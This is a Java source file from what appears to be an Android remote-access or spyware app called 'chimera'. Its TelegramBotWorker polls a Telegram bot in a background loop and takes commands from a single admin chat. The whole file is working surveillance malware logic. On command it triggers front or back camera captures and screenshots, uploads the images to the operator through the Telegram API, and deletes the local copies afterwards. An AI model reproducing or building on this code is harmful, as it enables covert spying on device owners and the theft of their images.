package com.chimera;

import android.content.Context;
import android.content.Intent;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramBotWorker implements Runnable {
    private Context context;
    private long lastUpdateId = 0;
    private int interval = 5000;

    public TelegramBotWorker(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                poll();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
            }
            try {
                Thread.sleep(interval);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Sleep", e);
            }
        }
    }

    private void poll() {
        try {
            String token = ConfigLoader.getBotToken();
            long admin = ConfigLoader.getAdminId();
            if (token == null || admin == 0) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=5";
            if (lastUpdateId > 0) {
                urlStr += "&offset=" + (lastUpdateId + 1);
            }
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            InputStream is = conn.getInputStream();
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int read;
            while ((read = is.read(buf)) != -1) {
                out.write(buf, 0, read);
            }
            String resp = out.toString("UTF-8");
            is.close();
            conn.disconnect();
            JSONObject obj = new JSONObject(resp);
            if (!obj.getBoolean("ok")) return;
            JSONArray arr = obj.getJSONArray("result");
            for (int i = 0; i < arr.length(); i++) {
                JSONObject upd = arr.getJSONObject(i);
                if (upd.has("update_id")) {
                    lastUpdateId = upd.getLong("update_id");
                }
                if (upd.has("message")) {
                    JSONObject msg = upd.getJSONObject("message");
                    JSONObject chatObj = msg.getJSONObject("chat");
                    long chatId = chatObj.getLong("id");
                    if (chatId == admin) {
                        handleMessage(msg);
                    }
                } else if (upd.has("callback_query")) {
                    JSONObject cb = upd.getJSONObject("callback_query");
                    long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
                    if (chatId == admin) {
                        handleCallback(cb);
                    }
                }
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_Poll", e);
        }
    }

    private void handleMessage(JSONObject msg) {
        try {
            String text = msg.getString("text");
            long chatId = msg.getJSONObject("chat").getLong("id");
            if (text.equalsIgnoreCase("/command")) {
                sendMenu(chatId);
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
        }
    }

    private void sendMenu(long chatId) {
        try {
            String token = ConfigLoader.getBotToken();
            String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
            String body = "{\"chat_id\":" + chatId + ",\"text\":\"Choose Command\",\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"CAM1\",\"callback_data\":\"CAM1\"},{\"text\":\"CAM2\",\"callback_data\":\"CAM2\"}], [{\"text\":\"SCREENSHOT\",\"callback_data\":\"SCREENSHOT\"}] ]}}";
            post(urlStr, body, context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
        }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");

            switch (data) {
                case "CAM1":
                case "CAM2":
                    post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", "{\"chat_id\":" + chatId + ",\"text\":\"Taking picture...\"}", context);
                    CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
                        @Override
                        public void onPictureTaken(String filePath) {
                            uploadFile(filePath, chatId, data + " Picture", context);
                        }
                        @Override
                        public void onError(String error) {
                            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", "{\"chat_id\":" + chatId + ",\"text\":\"Camera Error: " + error + "\"}", context);
                        }
                    });
                    break;

                case "SCREENSHOT":
                    post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", "{\"chat_id\":" + chatId + ",\"text\":\"Requesting screenshot permission...\"}", context);
                    Intent intent = new Intent(context, ScreenshotActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
        }
    }

    public static void post(String urlStr, String jsonBody, Context context) {
        // Run on a separate thread to avoid NetworkOnMainThreadException
        new Thread(() -> {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
            }
        }).start();
    }


    public static void uploadFile(String filePath, long chatId, String caption, Context context) {
        new Thread(() -> {
            String token = ConfigLoader.getBotToken();
            String urlStr = "https://api.telegram.org/bot" + token + "/sendPhoto";
            String boundary = "===" + System.currentTimeMillis() + "===";
            String LINE_FEED = "\r\n";

            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);

                File fileToUpload = new File(filePath);
                if (!fileToUpload.exists()) return;

                try (OutputStream os = conn.getOutputStream();
                     PrintWriter writer = new PrintWriter(os, true)) {

                    // Chat ID part
                    writer.append("--").append(boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
                    writer.append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED).flush();

                    // Caption part
                    writer.append("--").append(boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED);
                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
                    writer.append(LINE_FEED).append(caption).append(LINE_FEED).flush();

                    // File part
                    writer.append("--").append(boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(fileToUpload.getName()).append("\"").append(LINE_FEED);
                    writer.append("Content-Type: image/jpeg").append(LINE_FEED);
                    writer.append(LINE_FEED).flush();

                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                        os.flush();
                    }

                    writer.append(LINE_FEED).flush();
                    writer.append("--").append(boundary).append("--").append(LINE_FEED).flush();
                }

                conn.getInputStream().close();
                conn.disconnect();
                fileToUpload.delete(); // Clean up the file after upload

            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_UploadFile", e);
            }
        }).start();
    }
}